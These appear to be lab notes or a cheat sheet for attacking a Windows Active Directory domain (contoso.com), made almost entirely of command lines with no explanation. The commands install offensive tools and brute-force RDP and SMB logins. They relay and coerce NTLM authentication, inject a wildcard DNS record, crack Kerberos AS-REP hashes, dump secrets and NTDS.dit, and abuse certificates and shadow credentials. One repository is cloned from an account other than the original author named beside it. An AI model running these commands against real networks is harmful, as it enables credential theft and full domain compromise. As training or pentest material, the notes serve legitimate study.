...
sudo apt install hydra crowbar hashcat patator maskprocessor wordlists -y
sudo apt install git wireshark chromium iptables -y
sudo apt install python3-impacket python3-dsinternals crackmapexec python3-pip -y
sudo cp /usr/bin/impacket-wmiexec /usr/bin/impacket-ntlmrelayx
pip3 install mitm6 minikerberos impacket adidnsdump certipy bloodhound
cd ~
git clone https://github.com/Wh04m1001/DFSCoerce
git clone https://github.com/dirkjanm/krbrelayx
git clone https://github.com/MalwareMike88/PKINITtools
# For minikerberos 3.x: git clone https://github.com/dirkjanm/PKINITtools
```
...
```bash
adidnsdump --user CONTOSO\\bfu --password 'Pa$$w0rd' --print-zones --ssl contoso-dc.contoso.com
adidnsdump --user CONTOSO\\bfu --password 'Pa$$w0rd' --zone contoso.com --ssl --verbose contoso-dc.contoso.com --ssl
cat records.csv
```
...
```cmd
\\local\GOC213\PingCastle_3.1.0.0\pingcastle.exe --scanner smb --server contoso.com --scmode-all
```
...
```cmd
\\local\GOC213\PingCastle_3.1.0.0\pingcastle.exe --scanner share --server contoso.com --scmode-all
```
...
```cmd
\\local\GOC213\PingCastle_3.1.0.0\pingcastle.exe --scanner computerversion --server contoso.com --scmode-all
...
```bash
patator rdp_gateway url=https://contoso-srv.contoso.com/Rpc user_pass=Admin:FILE0 0=passwords.txt resolve=contoso-srv.contoso.com:10.213.0.5 -x ignore:code=401 -x quit:code=503
```
...
```bash
patator smb_login host=contoso-dc port=445 user=Admin domain=CONTOSO password=FILE0 0=passwords.txt -x ignore:fgrep='STATUS_LOGON_FAILURE'
```
...
sudo impacket-ntlmrelayx -t contoso-srv -smb2support --no-http-server --smb-port 8445
```
...
```bash
sudo python3 DFSCoerce/dfscoerce.py -u bfu -p 'Pa$$w0rd' -d contoso.com 10.213.0.100 contoso-dc2.contoso.com
```
...
```bash
 python3 krbrelayx/dnstool.py -u 'CONTOSO\bfu' -p 'Pa$$w0rd' --record '*' --action add --data 10.213.0.100 contoso-dc.contoso.com
 python3 krbrelayx/dnstool.py -u 'CONTOSO\bfu' -p 'Pa$$w0rd' --record '*' --action query contoso-dc.contoso.com
```
...
E:
cd E:\GOC213\hashcat-6.0.0
hashcat.exe -m 18200 $krb5asrep$23$user@domain.com:3e156ada591263b8aab0965f5aebd837$ example.dict --potfile-disable
```
...
KRB5CCNAME=admin.ccache impacket-secretsdump -k -no-pass contoso.com/Admin@contoso-pc2.contoso.com
```
...
```cmd
\\local\GOC213\GhostPack\Rubeus.exe asktgt /user:admin /certificate:admin.pfx /password:admin /ptt /getcredentials
...
```cmd
whisker list /target:Admin
whisker add /target:Admin
whisker clear /target:Admin
```
...
```cmd
ntdsutil "ac in ntds" ifm "create full C:\ADBackup" quit quit
```
...
```powershell
Enter-PSSession -ComputerName CONTOSO-SRV -Credential CONTOSO\Admin # Password is mimikatz
```
...
```cmd
\\local\GOC213\PingCastle_3.1.0.0\pingcastle.exe --healthcheck --server contoso.com --user CONTOSO\bfu --password 'Pa$$w0rd' --protocol LDAPOnly --quota 10 --level Full --no-enum-limit --explore-trust --explore-forest-trust
```

```cmd
\\local\GOC213\PingCastle_3.1.0.0\pingcastle.exe --carto
```

```cmd
\\local\GOC213\PingCastle_3.1.0.0\pingcastle.exe --scanner spooler --server contoso.com --scmode-dc
